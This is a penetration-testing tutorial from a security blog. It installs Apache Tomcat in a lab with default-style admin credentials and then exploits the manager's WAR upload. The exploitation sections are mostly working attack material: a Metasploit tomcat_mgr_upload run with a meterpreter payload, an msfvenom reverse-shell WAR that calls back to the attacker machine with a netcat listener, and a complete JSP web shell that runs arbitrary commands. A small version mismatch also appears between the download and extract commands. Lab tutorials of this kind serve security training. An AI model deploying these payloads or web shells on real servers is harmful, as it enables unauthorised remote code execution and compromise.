<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Tomcat Penetration Testing</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/tomcat-penetration-testing/" rel="bookmark"><time class="entry-date published" datetime="2024-04-23T17:35:53+00:00">April 23, 2024</time><time class="updated" datetime="2025-06-19T13:23:24+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p data-start="190" data-end="646"><span style="color: #000000"><strong data-start="190" data-end="220">Tomcat Penetration Testing</strong> is essential for identifying vulnerabilities in <strong data-start="269" data-end="286">Apache Tomcat</strong>, a widely used web server and servlet container. Originally, the <strong data-start="356" data-end="386">Apache Software Foundation</strong> developed <strong data-start="397" data-end="407">Tomcat</strong> to serve as a demonstration platform for <strong data-start="449" data-end="465">Java Servlet</strong> and <strong data-start="470" data-end="496">JavaServer Pages (JSP)</strong> technologies, which power <strong data-start="523" data-end="548">Java web applications</strong>. Over time, <strong data-start="561" data-end="571">Tomcat</strong> expanded its capabilities to support additional <strong data-start="620" data-end="645">Java web technologies</strong>.</span></p>
<p data-start="648" data-end="1054"><span style="color: #000000">Moreover, a notable feature of <strong data-start="679" data-end="689">Tomcat</strong> is its support for deploying web applications using <strong data-start="746" data-end="785">WAR (Web Application Archive) files</strong>. These files bundle together all the components of a web application, including code, pages, and files, making deployment simpler. As a result, <strong data-start="934" data-end="944">Tomcat</strong> allows users to upload and run these <strong data-start="982" data-end="995">WAR files</strong>, enabling them to host their applications on the internet.</span></p>
<p data-start="1056" data-end="1375"><span style="color: #000000">In addition to <strong data-start="1071" data-end="1084">WAR files</strong>, <strong data-start="1086" data-end="1096">Tomcat</strong> also supports the deployment of <strong data-start="1129" data-end="1142">JSP pages</strong>. <strong data-start="1144" data-end="1151">JSP</strong> is a technology that enables developers to create dynamic web pages using <strong data-start="1230" data-end="1238">Java</strong>. Therefore, <strong data-start="1251" data-end="1261">Tomcat</strong> can execute these <strong data-start="1280" data-end="1293">JSP pages</strong>, making it a versatile platform for hosting a wide range of <strong data-start="1354" data-end="1374">web applications</strong>.</span></p>
<p data-start="1377" data-end="1609"><span style="color: #000000">By default, <strong data-start="1389" data-end="1399">Tomcat</strong> supports the use of <strong data-start="1420" data-end="1433">WAR files</strong> and <strong data-start="1438" data-end="1451">JSP pages</strong>. However, administrators can configure settings to ensure <strong data-start="1510" data-end="1522">security</strong> and control over file uploads, thereby enhancing the overall safety of the server.</span></p>
<h3><span style="color: #800000"><strong>Table of Contents</strong></span></h3>
<ul>
<li><strong><span style="color: #000000">Lab Setup</span></strong></li>
<li><strong><span style="color: #000000">Installation</span></strong></li>
<li><strong><span style="color: #000000">Configuration</span></strong></li>
<li><strong><span style="color: #000000">Enumeration</span></strong></li>
<li><strong><span style="color: #000000">Exploitation using Metasploit Framework</span></strong></li>
<li><strong><span style="color: #000000">Exploiting Manually (Reverse shell)</span></strong></li>
<li><strong><span style="color: #000000">Exploiting Manually (Web shell)</span></strong></li>
<li><strong><span style="color: #000000">Conclusion</span></strong></li>
</ul>
<h3><span style="color: #800000">Lab Setup</span></h3>
<p><span style="color: #000000">In this article, we are going to setup the Tomcat server on the ubuntu machine and exploit the file upload vulnerability. Following are the machines:</span></p>
<p><span style="color: #000000"><strong>Target Machine:</strong> Ubuntu (192.168.1.5)</span></p>
<p><span style="color: #000000"><strong>Attacker Machine:</strong> Kali Linux (192.168.1.7)</span></p>
<h3><span style="color: #800000">Installation</span></h3>
<p><span style="color: #000000">Apache Tomcat relies on Java, meaning youâ€™ll need to have the Java JDK installed on your server. You can install it by running the command below:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install openjdk-11-jdk</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjzLh7iXIcn8F3tNFjRPeSxFUrSXbJ5irE9eEKLb7lN-CUHbCU9GBtPVrYA6SgUB6iXOkIdxUVnhr0wppmma7Yj_W-B52K2pJGoL89kV8qlddD4Q3MtT8O4_ZM81QolzBrZGEFCQyEaU00IsR3qanonwb2HnByFAm2A2Pfc0a07i16CykH-DbwEpr6T4uf/s16000/1.png"/></span></p>
<p><span style="color: #000000">Add a new user by the name <strong>tomcat</strong> using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">useradd -m -U -d /opt/tomcat -s /bin/false tomcat</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjiyzxF2UvCrydGpgVJiYqkG9oWOG1YhuButOcVzl1rXWZJYm4TN8aGRFcExcuTooZNXSrFBAFpN5Q6aj4YbRGcYEBTetZ5b6RimKST3i03IfWnk4LE7UwyPgJlrEn2tfOmLJG8k-eE-40X5e9HC79HKJnDY-0C1Iksl4OudidqGNite5JJbpLYxLynJL-1/s16000/2.png"/></span></p>
<p><span style="color: #000000">Next, download the Tomcat <strong>tar.gz</strong> file from the official website.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1cvbdzS-G35VYBCNKhyphenhyphenjy2c2SD5SXE5HF66ytkPuMG3wWt8mKLwFRDeR62K6dMJLuSiqicIB_KWASEk_tGgeM9pQ2uJjDB6IuXiURUXD8Tf99YcGlhoPJtjMO68mW1jGnOn93oR2E1H8oIL1vO8bsjr7O__GAZFqSOPzeGJ6yBOIZp2poV8eUM_afV4Bp/s16000/3.png"/></span></p>
<p><span style="color: #000000">Then, download the latest version from the website into the ubuntu machine and extract the downloaded files.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget https://archive.apache.org/dist/tomcat/tomcat-10/v10.0.20/bin/apache-tomcat-10.0.20.tar.gz
tar -xvf apache-tomcat-10.1.20.tar.gz</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEguQzXfqFp642sufplZqEMMM8TJfEV6i5q3F1fTLDUIzha_s_wZjhaAtgfs2ZzBQVonmkj50KHbf7Qhu6fUkTFtXgj2HUZ8x3J9mDAQ1TfrXafa-BVMOsBP6p0ie2108gW4P7n15wfVtx2xorglr1ck0c4w2g7l2gpEa-8gwsAPzlAIyPe0CVCYUdhtcoCV/s16000/4.png"/></span></p>
<p><span style="color: #000000">Move the extracted folder in the <strong>/opt/tomcat</strong> directory, give the ownership permissions to tomcat user and set the execution permission on binary files.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mv apache-tomcat-10.1.20/* /opt/tomcat
chown -R tomcat: /opt/tomcat
sh -c 'chmod +x /opt/tomcat/bin/*.sh '</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiWFPQ6D1-1jIOrdeuQ0mIfJkdG_fv1OViFSeuCLxtDZTmQvnRKvmWUsMPpgLoptrG4PT4s5_SncYLemzNLSzYSgLh4OwIjGw9DC6p476ULN9sIH701L2IqxOIk__vSQLXIeyjCYSos2ykJvBBTEyuC3SPKx6B22BMffwgAfbo3k-W_7vVpGIvdwor8QDTI/s16000/5.png"/></span></p>
<p><span style="color: #000000">Create a <strong>tomcat.service</strong> file in the <strong>/etc/systemd/system/</strong> directory and add the following content in the file:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">[Unit]
Description=Apache Tomcat
After=network.target

[Service]
Type=forking

User=tomcat
Group=tomcat

Environment=JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64
Environment=CATALINA_PID=/opt/tomcat/tomcat.pid
Environment=CATALINA_HOME=/opt/tomcat
Environment=CATALINA_BASE=/opt/tomcat
Environment="CATALINA_OPTS=-Xms512M -Xmx1024M -server -XX:+UseParallelGC"

ExecStart=/opt/tomcat/bin/startup.sh
ExecStop=/opt/tomcat/bin/shutdown.sh

ExecReload=/bin/kill $MAINPID
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAfrxQXq4R-KeIK02EWM-H67QQVjhwFwdlps34Hgv91E0gDF9he6Ba41clONUyJnA7XGlR21DGN60EMTPRhuOoOxJMMUIdir3vcOXL6PWLlW_GiRzsUj6tD4Jl-3jd7ceJTbyinLNrXG1HCgTGLMm4zsLCNSVxAttRy92RdzGM8Vlr03hfFIX_UvL16gwW/s16000/6.png"/></span></p>
<p><span style="color: #000000">Reload the systemd daemon to apply the changes using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">systemctl daemon-reload</pre>
<p><span style="color: #000000">Â Also, enable the tomcat service to start at system reboot.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">systemctl enable --now tomcat</pre>
<p><span style="color: #000000">Checking the status of the tomcat server:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">systemctl status tomcat</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2qOIUQpwzmpb2CsYbgC7QU3Qtavpo5UnB-I4tnhxdOIYnBRcoUspyzlST1TY4ZNcPiTNodFwtIe-5IikOOYTsEGV0MgEhDW4ICQovkUqbF18RfNv4tQ4e1TPZnhROuLtqMwu9F44wQYhlL5NU3Qaq0NM4lMv5_TtsHlTquJZtBVpfE4LwuRpfArdSUfoN/s16000/7.png"/></span></p>
<h3><span style="color: #800000">Configuration</span></h3>
<p><span style="color: #000000">After the installation is complete, its time to configure the Tomcat server.</span></p>
<p><span style="color: #000000">To create admin user password, make changes in the following file:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /opt/tomcat/conf/tomcat-users.xml</pre>
<p><span style="color: #000000">Add the following code above the <strong>&lt;/tomcat-users&gt;</strong>:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;role rolename="admin-gui"/&gt;
&lt;role rolename="manager-gui"/&gt;
&lt;user username="admin" password="password" roles="admin-gui,manager-gui"/&gt;</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjRqlVXRZTPrib7j27QyUqYyBCtWzST34tYtu96sfCW2EUZFXuIwQrvVR-pBLOrdTMHC4tob7n5nUrXvtnIgHSGkU98IgbctMsrGWkwOrxT1qR1ZUevxLSHZlL_gylXt24dgdedPR8j5puBRptK9Qpl1tyxsrx9XqBbWdc1SsC2w8a63_OKOi6XEqF-AwaM/s16000/8.png"/></span></p>
<p><span style="color: #000000">To enable remote access for Tomcat Manager, make the following changes in the <strong>context.xml</strong> file present in the <strong>manager </strong>and <strong>host-manager</strong> directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /opt/tomcat/webapps/manager/META-INF/context.xml
nano /opt/tomcat/webapps/host-manager/META-INF/context.xml</pre>
<p><span style="color: #000000">Remove the following line from both the above files as shown below:</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgikTu_a1VD4Pa5inIFIglkt-2K_dPgSWMYcRPQJwnf4QPa7oGiQYkE9bp0kWGXj3SyahPwHinDojJtGH2ktkRBVVvx5QxTOrlN37xNu-MY9AEMYQWT8149aYmFkEWitpyhqI2OjjUT69E4Nc2BQl5HYTPQNZ544NkfMg9pmVmEP8x4t-Q7qHZJxBEBWetI/s16000/9.png"/></span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKdniaBEsend6AYTRlo0x44cY0iIySOAJVNmjwGJdlS8_LaN0DGsmA9mvwKGWR8nHBHqJGb6PMpAP3bW8L-57lgMfhcXmXDoLkTplF5NUXm2toLchnFCspuExVdke6SGAzrgimvmJkOab5KNWH2rCQEQXwOHPzSe8xuLs0WH3_dhxJzftYNZFVl2COigoK/s16000/10.png"/></span></p>
<p><span style="color: #000000">Once done with the changes, restart the tomcat service in ubuntu.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">systemctl restart tomcat</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg7EdD8nLBI7cW_G1Isf8MiTQnUTnhDcTcU0n4-91uaT_FwuvWyqKtA-taDij0vqX916LuFHn8lRPCTxrl9dPRsbun7VkMsrrsbLfVYDFakAnMA-bh_gg95bD5wvBPg8qIpIPO7Rrc15Jvd0eSu85cL2U_MRt6feYweeZb57b_Tt58QVUN9y11y7coYaCrP/s16000/11.png"/></span></p>
<p><span style="color: #000000">Observe that the Tomcat server is up and running on port 8080 in the ubuntu machine.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhf4p3Z42UtM4ZrULMg6v3xkr0i2f21iUwJcMa2ainPsTQRR13O5SFxtWdNPAFNQiXX2PZIT6QqB1cdpoIvZZrAtXs3VyVEdbLxwPwfetMeEGviAz3l9xaP-MXPt5RDMzSC6skoBL5J1BoKOghRu97hMoSE4SD_DViXHIHZATFcGrJMkNa5LqrUlP2Sskry/s16000/12.png"/></span></p>
<h3><span style="color: #800000">Enumeration</span></h3>
<p><span style="color: #000000">After the installation and configuration is complete, now starting the enumeration phase.</span></p>
<p><span style="color: #000000">Using Kali linux as an attacker machine, initial enumeration can be performed using nmap.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p 8080 -sV 192.168.1.5</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjA3_rhNlmduY5usT6JBwU0EsfpO9Oj7rATaUNtBeS_BsPLiVWUblOphUl1Gf-9lN8cbzDOZrZtKJVorM_zolWT-xuY7U9AdqdEeTNHS_Zlttyr1zhMY4Is_20teYbkq0S10s46z_C5za5ebpCJKtvEU-iTe3ztqhu3c3bUL9L2eEQERn3MmJN6JpWl01Yt/s16000/13.png"/></span></p>
<h3><span style="color: #800000">Exploitation using Metasploit Framework</span></h3>
<p><span style="color: #000000">First trying to exploit the functionality using <strong>Metasploit</strong> as an exploit is already available for the tomcat file upload vulnerability. The exploit used here is <strong>exploit/multi/http/tomcat_mgr_upload</strong>.</span></p>
<p><span style="color: #000000">Inside Metasploit, type the below given commands to run the exploit:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/http/tomcat_mgr_upload
set rhosts 192.168.1.5
set report 8080
set httpusername admin
set httppassword password
show targets
set target 2
set payload linux/x86/meterpreter_reverse_tcp
exploit</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhG0bd-3CGAcK5Y0hNWccsYLN9lQlZsQ4xg6MPI89LcqSTbxk9gjj-95NJ6fpEVu75p_tiUzrkJrntT5q5AH5-bdBTBjZlvc_Wry71a2kcur_rcVOFvhpT8SpAUJahNtlQ4fshNhxW4SGEgDL8wwAb4EVonF2qZeIjdyfFIF7ezwWQ_76STgur2AEQsvw0R/s16000/50.png"/></span></p>
<p><span style="color: #000000">From above it can be seen that a reverse shell is obtained and the commands can be executed using the <strong>meterpreter</strong> shell.</span></p>
<h3><span style="color: #800000">Exploiting Manually (Reverse Shell)</span></h3>
<p><span style="color: #000000">Additionally, attackers can also perform the above <strong data-start="184" data-end="217">exploitation process manually</strong>. To do that, they first need to create a <strong data-start="259" data-end="272">.war file</strong> using <strong data-start="279" data-end="291">msfvenom</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.1.7 lport=1234 -f war &gt; shell.war</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_EV1VPpAKeR0K6FW4BHMHqKmCTR1yU9zbtgvo6fhUoxqZVGGELXcX4ugqdjk5XEl05_j8omwcgah1wiJarsRHpo8GxjaQCoIpf9qMRCBUlgM29xTiPBb_2ub9gCGRGASqV8kcbniy7j9ztpC8alRMwl09GUeaTm5BK_7oElrJrKECOtK3Wkcl-WLT_fZa/s16000/51.png"/></span></p>
<p><span style="color: #000000">Next, after generating the <strong data-start="421" data-end="439">shell.war file</strong>, attackers must upload it to the <strong data-start="473" data-end="495">Tomcat Manager App</strong>.</span></p>
<p><span style="color: #000000">To access the <strong data-start="512" data-end="527">Manager App</strong>, users must provide <strong data-start="548" data-end="572">basic authentication</strong>. Typically, the username is <code data-start="601" data-end="608">admin</code> and the password is <code data-start="629" data-end="639">password</code> to gain access to the <strong data-start="662" data-end="684">Tomcat manager app</strong>.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg4Huj-4-ECuo2F7zJjRbJH5MVrj9at11C9527HZiI6h95EQM7d1oMN4VuZ0eNy1LUYAYrvov0czaIV4JZpU6AU8P8EvBb7MIr5BTm-ozBY6o5pBzf7EgLG4PPKnuXaAikN58LYZ6W8I8K-F2yMCkVe8vJTkifUj9r21iL5fOR4SgFg_PLtPLivuuqkfGmZ/s16000/52.png"/></span></p>
<p><span style="color: #000000">Once logged in, they can upload the previously created <strong data-start="742" data-end="760">shell.war file</strong> using the <strong data-start="771" data-end="808">WAR file deployment functionality</strong>.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjA_acElxWr0s_zXJJ3nilCWmB8z7uxQYjUbM1DDVLyCC951GI8MXzwPWV9IDSRHPtZbQdHGUSUohXG95fRirx2Sy0ZKH7TjFkSBTbq6GGmcVDtzEtE4HxqinibikECEwNY-hgayueBVdYROu7l-7Wqin1mb0sS6X2ukd_gCXtWGz4zz3JBw3CpbLgn5CEm/s16000/53.png"/></span></p>
<p><span style="color: #000000">Once the file is uploaded it can be seen in the uploaded files section.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhdmw4v8FRyx383ZZX7SNTskIlgFIdn49K53QEp1Pv8DJrhAy5g1IseL6vOQfurrgpieINmtSVHLVakJBHsC9hIxHbEk6-wESpWvup34VPFP8arMzbeUvSEXtZ3RlMQn-tSAK3CCgLXMBd4Pd3CmClOVJy8qGf1sbrsGm56zvIas_G9OC_fzwBa0lNLvNwe/s16000/54.png"/></span></p>
<p><span style="color: #000000">Before accessing the uploaded file, start a <strong>netcat</strong> listener on port <strong>1234</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rlwrap nc -lvnp 1234</pre>
<p><span style="color: #000000">Click on the <strong>/shell</strong> to access the file to obtain a reverse shell.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiEMs5pCsUOeOdFclnX8k3_6lV-yiME2kbYq9bSZ7h-h-uW0_5AlqKh-mjrJOks_y2R1HMNsqHV-JTiN2qEEIcUx3VcukShwDz0PVyPR7tKPWo8A83eWrT344q0KfHoHbb4avBQyAAiJCB6L6DWNOlQNg7T3gADQuSF6-sU1X2T-mFq_-aJKTdHD4GERIHl/s16000/55.png"/></span></p>
<p><span style="color: #000000">The reverse shell is obtained at port 1234.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCxO-0t8OMi0Mnr8xfwGFUNf6VkrYrsl7xXnBWKWHUh_nej3ty7ARDzHwAaQzKCh8zAzywjgUFYdFUIwqfqHzHdr3luntMHtwFUP1eBFp8miHpGTyVUw7Fw4APkXjkO0CLa7Al1Iivu_KbyTOhKTA8W1xo8hMTRUQ0bYsVIAtv8MkRjrCUo9AKViINiOUx/s16000/56.png"/></span></p>
<h3><span style="color: #800000">Exploiting Manually (Web Shell)</span></h3>
<p data-start="1611" data-end="1788"><span style="color: #000000">To get a <strong data-start="1620" data-end="1633">web shell</strong>, attackers can use a <strong data-start="1655" data-end="1668">.war file</strong> that contains <strong data-start="1683" data-end="1697">.jsp files</strong>. Once the <strong data-start="1708" data-end="1721">.war file</strong> is uploaded to the server, it provides access to the <strong data-start="1775" data-end="1787">webshell</strong>.</span></p>
<p data-start="1790" data-end="1910"><span style="color: #000000">In order to create a <strong data-start="1811" data-end="1824">.war file</strong> containing <strong data-start="1836" data-end="1850">.jsp files</strong>, users must install <strong data-start="1871" data-end="1879">Java</strong> in the <strong data-start="1887" data-end="1909">Kali Linux machine</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install openjdk-11-jdk</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivmY_-yqwuud_Ybe1ep9AyraqsjP9_7CJIZPF12ivSymTx8tKFBtcWEGA7qC5iqBRv2OlRA7f9r_t4xfXZ6Q7LpVwubwbJQEfzlIZt7ti_vyx0cn8Q592vKZONhNVA33zDdxT6VljveyCWuHsR8HlIAmk3x9ahxhbk10oIkqnhCbAtoU6OyZH2-ARHjPWc/s16000/57.png"/></span></p>
<p><span style="color: #000000">Now, create a <strong>webshell</strong> directory, within it we will place the <strong>index.jsp</strong> file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir webshell
cd webshell
nano index.jsp</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmOu2dJPjDra9-VQFHNRQFLU4pz6FZvVFLLEtlPsPS6BtuNq_gJjXK7UEjdeZ_np_rFKUQcAUDI9VSaoYsyjX6Gs-TFw0nyo9Xtu5MahvcMvNbSSHrZc5iWWGMuBJT9aGBgdq-1gWtS-dYXYkWYFuFqS18C3rHGYC45YxhyphenhyphenjBfkylLujPX8-8Nbc5LFCoy/s16000/58.png"/></span></p>
<p><span style="color: #000000">Copy the following code in the <strong>index.jsp</strong> file for the web shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;FORM METHOD=GET ACTION='index.jsp'&gt;
&lt;INPUT name='cmd' type=text&gt;
&lt;INPUT type=submit value='Run'&gt;
&lt;/FORM&gt;
&lt;%@ page import="java.io.*" %&gt;
&lt;%
Â Â  String cmd = request.getParameter("cmd");
Â Â  String output = "";
Â Â  if(cmd != null) {
Â Â Â Â Â  String s = null;
Â Â Â Â Â  try {
Â Â Â Â Â Â Â Â  Process p = Runtime.getRuntime().exec(cmd,null,null);
Â Â Â Â Â Â Â Â  BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
Â Â Â Â Â Â Â Â  while((s = sI.readLine()) != null) { output += s+"&lt;/br&gt;"; }
Â Â Â Â Â  }Â  catch(IOException e) {Â Â  e.printStackTrace();Â Â  }
Â Â  }
%&gt;
&lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9cTkbkQAKJB2kkDFQqvlawg7ZQiwFiSWCHwu7g6bHvlJTeYekCPcG7M-g-E7CRlfk3QBO8asT7rWwfsqVEKsbIr3iEvzwZD7u78ckmXqcxmY9ctKBo4lFrimRywAppw-dyrMXXo7OLpeywzFVhNc4CJMwa8fCXt6mWfy8vrjCU3FAklSuHuraH4W4Gywv/s16000/59.png"/></span></p>
<p><span style="color: #000000">After the <strong>index.jsp</strong> file is created, the package can now be created after converting the directory into a <strong>.war</strong> file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">jar -cvf ../webshell.war *</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhA-9regFVhXhzyqOChP0mkvTwtRe6aDeUMr6XHJjTIt4NGixM2jJCpSiYd49tyydfX_rSrALIWHGbLuObLISj8EVX05kAg8NdVdpFz_CEWqKx9huc0YO5aqfIq1C-rPPFI2HxgztBaxjizyMa9O1ywfrcwaRhJzsk2Uzd4VrKijCAm12nowxeaFQyajswf/s16000/60.png"/></span></p>
<p><span style="color: #000000">After the webshell.war file is created, uploading it in the deploy functionality.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiSKwmCulQtl2yhOUEap9XtnTGTwJMz9AyUeAZRN-aHfhxCH1IJhaOdesdOJfGahJI0CE8a5rIsnfw2jHhMj9C3YZukITqVTjEln-Hz-Me0QAjMmFqjBTTLinRnkw7w1mvlACOSaOdpq45ChzF60lOItHRPMOvhSgvoxbCRi-DMzYFw-db3Fvh89qeNP2sr/s16000/61.png"/></span></p>
<p><span style="color: #000000">The <strong>index.jsp</strong> page can be accessed within the uploaded webshell directory and a webshell is obtained.</span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifbyGAYirHvCmn71pKZC9Ik5oDTcoT2PmrNUazKq48bMMe_OC1PkpaVMQy8KmzEv8rNZ24f_AOKG3nLKDjW6g2Cf6v1TFhq81p3Pv6B5vlJ-FvgJTeAhlmwgKprP-gaJkkq6MpXj1piiGcqlNh8TUoZ9seCJuwhBsq02x9o86G_DQoQZB_CAg6CU-X1Dro/s16000/62.png"/></span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgP5v6Wxxo8OkON2gYxePhztUo6_aAN4_k-bqzKK_mE_m6EmBxPMweYHBRXHbd4Wvikf_knO97OGYI_LMV5RRKAnkjjYY_C4tPHpgZ1Y55OqOLOEoN-k7fbhcawXtRsX7lba4IRPwL3-sSujU5zHdIfDEQ7LNTT1E8TzC_w7Tdot0HB6tjx2MSrPBISRBAq/s16000/63.png"/></span></p>
<p><span style="color: #000000">An alternative way to do the above manual exploitation can by downloading the <strong>cmd.jsp</strong> file and creating a <strong>webshell.war</strong> file using <strong>zip</strong>.</span></p>
<p><span style="color: #000000">The webshell jsp file can be downloaded from here:</span></p>
<p><span style="color: #0000ff"><a style="color: #0000ff" href="https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/jsp">https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/jsp</a></span></p>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh17ciCJlKx4HnUx_XMhQm7R3cx_li9r3GX1NmpMe7F0uRVJtH7oYYXjuPLE-9NI279CygwSwqDY_r1D2-goWDbTAzhJSH3ibastfOIFwx-RPVZ1WoGEQtusGR82Etpox-L6p9SJtu8AAmzycmYoh9vA1GbAgHS_LyfcFImRyK7a4z2eKUjxR6f4rviUn3_/s16000/64.png"/></span></p>
<p><span style="color: #000000">Next, after the <strong>cmd.jsp</strong> file is downloaded, a <strong>revshell.war</strong> file can be created using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">zip -r revshell.war cmd.jsp</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDMYOTeY7WL5juMMlFPAhZaCE4RHke1DLj7w4A0NBgsiPVkcqF7nQ-6W_9yZ-AUWWaiEYkyHKlJX-VvAQubVHplh5HALvAZyzv5exmkpXieeBJZgXVaieI8_KOjUGCzrK3Ei0I7ahSyTQcD96KU1x5IZ9ZcXaDC-hjROY4EmFNbe2pUS7dfQSyUU-ZjYqv/s16000/65.png"/></span></p>
<p><span style="color: #000000">Again, repeating the same procedure as discussed earlier, after uploading the <strong>revshell.war</strong> file in the deploy functionality. The web shell is obtained after accessing the file at the path: <span style="color: #0000ff">http://192.168.1.5:8080/revshell/cmd.jsp</span></span></p>
